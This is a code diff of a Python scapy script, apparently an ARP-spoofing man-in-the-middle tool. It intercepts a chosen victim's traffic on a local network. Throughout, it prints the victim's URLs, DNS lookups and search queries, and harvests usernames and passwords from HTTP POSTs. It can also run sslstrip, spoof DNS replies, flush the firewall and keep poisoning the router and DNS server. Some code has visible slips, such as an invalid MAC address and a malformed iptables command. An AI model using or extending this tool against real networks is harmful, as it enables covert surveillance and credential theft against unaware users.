@@ -4,7 +4,7 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 conf.verb=0
-#Below is necessary to receive a response to the DHCP packets for some reason. If you know the answer to that message me.
+#Below is necessary to receive a response to the DHCP packets because we're sending to 255.255.255.255 but receiving from the IP of the DHCP server
 conf.checkIPaddr=0
 import time
 import sys
@@ -23,14 +23,15 @@ if not os.geteuid()==0:
 
 #Create the arguments
 parser = argparse.ArgumentParser()
-parser.add_argument("-u", "--urlspy", help="Show all URLs the victim is browsing minus URLs that end in .jpg, .png, .gif, .css, and .js to make the output much friendlier. Also prints searches. Use -uv to print all URLs.", action="store_true")
+parser.add_argument("-u", "--urlspy", help="Show all URLs the victim is browsing minus URLs that end in .jpg, .png, .gif, .css, and .js to make the output much friendlier. Also truncates URLs at 150 characters. Use -uv to print all URLs and without truncation.", action="store_true")
 parser.add_argument("-d", "--dnsspy", help="Show all DNS resquests the victim makes. This has the advantage of showing HTTPS domains which the -u option will not but does not show the full URL the victim is requesting.", action="store_true")
 parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning.")
 parser.add_argument("-i", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
-parser.add_argument("-s", "--sslstrip", help="Open an xterm window with sslstrip and output to sslstrip.txt", action="store_true")
-parser.add_argument("-uv", "--verboseURL", help="Shows all URLs the victim visits including possible searches.", action="store_true")
+parser.add_argument("-ssl", "--sslstrip", help="Open an xterm window with sslstrip and output to sslstrip.txt", action="store_true")
+parser.add_argument("-uv", "--verboseURL", help="Shows all URLs the victim visits", action="store_true")
 parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument")
 parser.add_argument("-p", "--post", help="Print the URL the victim POSTs to, show usernames and passwords in unsecure HTTP POSTs", action="store_true")
+parser.add_argument("-s", "--search", help="Print victim's search queries", action="store_true")
 args = parser.parse_args()
 
 class colors:
@@ -50,23 +51,36 @@ class colors:
 		self.ENDC = ''
 
 #Find the gateway and use it as the router's info
-routerCmd = bash('ip route')
-routerRE = re.search('default via ((\d{2,3}\.\d{1,3}\.\d{1,4}\.)\d{1,3}) \w+ (\w[a-zA-Z0-9]\w[a-zA-Z0-9][0-9]?)', routerCmd)
+ipr = bash('ip route')
+routerRE = re.search('default via ((\d{2,3}\.\d{1,3}\.\d{1,4}\.)\d{1,3}) \w+ (\w[a-zA-Z0-9]\w[a-zA-Z0-9][0-9]?)', ipr)
 routerIP = routerRE.group(1)
 IPprefix = routerRE.group(2)
 interface = routerRE.group(3)
 localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
 
-print "Checking the DNS server..."
-#dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
-#ans, unans = srp(dhcp_discover, timeout=7, retry=2)
-#if ans:
-#	for p in ans:
-try:
-	DNSserver = dhcp_request()
-	DNSserver = DNSserver[IP].src
-	print "DNS server at:", DNSserver, '\n'
-except:
+print "Checking the DHCP and DNS server addresses...\n"
+dhcp = (Ether(dst='ff:ff:ff:ff:ff:ff')/
+		IP(src="0.0.0.0",dst="255.255.255.255")/
+		UDP(sport=68,dport=67)/
+		BOOTP(chaddr='E3:2E:F4:DD:8R:9A')/
+		DHCP(options=[("message-type","discover"),
+			("param_req_list",
+			chr(DHCPRevOptions["router"][0]),
+			chr(DHCPRevOptions["domain"][0]),
+			chr(DHCPRevOptions["server_id"][0]),
+			chr(DHCPRevOptions["name_server"][0]),
+			), "end"]))
+ans, unans = srp(dhcp, timeout=5, retry=1)
+if ans:
+	for s,r in ans:
+		DHCPopt = r[0][DHCP].options
+		DHCPsrvr = r[0][IP].src
+		for idx,x in enumerate(DHCPopt):
+			if 'domain' in x:
+				localDomain = DHCPopt[idx][1]
+			if 'name_server' in x:
+				DNSsrvr = DHCPopt[idx][1]
+else:
 	print "No answer to DHCP packet sent to find the DNS server. Setting DNS server to router IP.\n"
 	DNSserver = routerIP
 
@@ -78,6 +92,14 @@ else:
 		ips = r.sprintf("%ARP.hwsrc% %ARP.psrc%")
 		print ips
 	victimIP = raw_input('\nType victim\'s IP: ')
+
+print "Active interface: " + interface
+print "Router IP: " + routerIP
+print "Client IP: " + victimIP
+print "Local IP: " + localIP
+print "DHCP server: " + DHCPsrvr
+print "DNS server: " + DNSsrvr
+print "Local domain: " + localDomain
 
 def originalMAC(ip):
 	# srp is for layer 2 packets with Ether layer, sr is for layer 3 packets like ARP and IP
@@ -96,7 +118,6 @@ def restore(routerIP, victimIP, routerMAC, victimMAC):
 def URL(pkt):
 #   Counter is to make sure we're not printing packet data twice if both username and password is found
 	counter = 0
-#	We add pkt[Ether].src check to make sure we're not messing with retransmitted packets
 	if pkt.haslayer(Raw) and pkt[Ether].src == victimMAC:
 		pkt = repr(pkt[Raw].load)
 		try:
@@ -109,7 +130,7 @@ def URL(pkt):
 			searched = re.search('((search|query|search\?q|\?s|&q)=([^&][^&]*))', url)
 			if searched:
 				searched = searched.group(3)
-				searched = searched.replace('q=', '').replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=')
+				searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=')
 				print colors.BLUE + '[+] Searched %s for:' % c[1],searched + colors.ENDC
 
 		post = re.search('POST /', headers)
@@ -125,14 +146,14 @@ def URL(pkt):
 			password = re.finditer('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', headers)
 			for u in username:
 				if u:
-					print colors.TAN,'[+] Packet was split by accident. Data:',headers, colors.ENDC
-					print colors.RED,u.group(),colors.ENDC
+					print colors.TAN+'[+] Packet was split. Data:',headers+colors.ENDC
+					print colors.RED+u.group()+colors.ENDC
 					counter = 1
 			for p in password:
 				if p:
 					if counter == 0:
-						print colors.TAN, '[+] Packet was split by accident. Data:', headers, colors.ENDC
-					print colors.RED, p.group(), colors.ENDC
+						print colors.TAN+'[+] Packet was split. Data:', headers+colors.ENDC
+					print colors.RED+p.group()+colors.ENDC
 			counter = 0
 		if (post or get) and host:
 			a = headers.split(r"\r\n")
@@ -158,11 +179,18 @@ def URL(pkt):
 				d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js']
 				if any(i in url for i in d):
 					return
-				print url
-				search(url)
+				if len(url) > 150:
+					print url[:149]
+				else:
+					print url
 			if args.verboseURL:
 				print url
-				search(url)
+			if args.search:
+				searched = re.search('((search|query|search\?q|\?s|&q|\?q|search\?p|keywords)=([^&][^&]*))', url)
+				if searched:
+					searched = searched.group(3)
+					searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=').replace('%22', '\"').replace('%24', '$')
+					print colors.BLUE + '[+] Searched %s for:' % c[1],searched + colors.ENDC
 
 def DNSreq(pkt):
 	if pkt.haslayer(DNSQR):
@@ -207,9 +235,6 @@ class driftnet(threading.Thread):
 	def run(self):
 		driftnet = bash('xterm -e driftnet -i %s' % interface)
 
-print "Active interface = " + interface
-print "Router IP = " + routerIP
-print "Client IP = " + victimIP
 try:
 	routerMAC = originalMAC(routerIP)
 	print "Router MAC: " + routerMAC
@@ -218,17 +243,17 @@ try:
 except:
 	sys.exit("Could not get MAC addresses")
 
+#Forward packets and flush iptables
+ipforward = bash('echo 1 > /proc/sys/net/ipv4/ip_forward')
+ipF = bash('iptables -F')
+ipNATF = bash('iptables -t nat F')
+ipX = bash('iptables -X')
+ipNATX = bash('iptables -t nat -X')
+print 'Enabled IP forwarding and flushed the firewall\n'
+
 def main():
 
-	#Forward packets and flush iptables
-	ipforward = bash('echo 1 > /proc/sys/net/ipv4/ip_forward')
-	ipF = bash('iptables -F')
-	ipNATF = bash('iptables -t nat F')
-	ipX = bash('iptables -X')
-	ipNATX = bash('iptables -t nat -X')
-	print 'Enabled IP forwarding and flushed the firewall\n'
-
-	if args.urlspy or args.google or args.verboseURL or args.post or args.search:
+	if args.urlspy or args.verboseURL or args.post or args.search:
 		ug = urlspy()
 		#Make sure the thread closes with the main program on Ctrl-C
 		ug.daemon = True
@@ -270,8 +295,8 @@ def main():
 	while 1:
 
 		poison(routerIP, victimIP)
-		if not DNSserver == routerIP:
-			poison(DNSserver, victimIP)
+		if not DNSsrvr == routerIP:
+			poison(DNSsrvr, victimIP)
 		time.sleep(1.5)
 
 
